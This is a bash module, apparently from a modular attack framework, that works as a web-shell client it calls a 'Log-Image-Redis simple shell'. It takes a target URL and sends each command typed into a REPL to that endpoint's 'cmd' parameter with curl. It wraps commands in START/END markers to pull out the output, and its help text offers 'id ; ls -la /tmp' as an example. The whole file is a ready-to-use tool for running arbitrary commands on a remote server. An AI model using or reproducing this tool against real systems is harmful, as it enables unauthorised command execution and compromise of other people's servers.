#!/usr/bin/env bash
# modules/my_module.sh

module_init() {
  URL="${1:-}"
  if [[ -z "$URL" ]]; then
    echo "[!] module_init: URL must be provided"
    return 1
  fi
}

send_cmd() {
  local cmd="$1"
  local wrapped_cmd="echo START; $cmd; echo END"
  local out
  out=$(curl -s --get --data-urlencode "cmd=$wrapped_cmd" "$URL")
  out="${out#*START}"
  out="${out%%END*}"
  echo -e "$out"
}

module_main() {
  : # optional
}

module_description() {
  echo "Log-Image-Redis simple shell"
}

show_module_help() {
  echo "Usage: <commands typed in REPL are passed to send_cmd>"
  echo "Example: id ; ls -la /tmp"
}
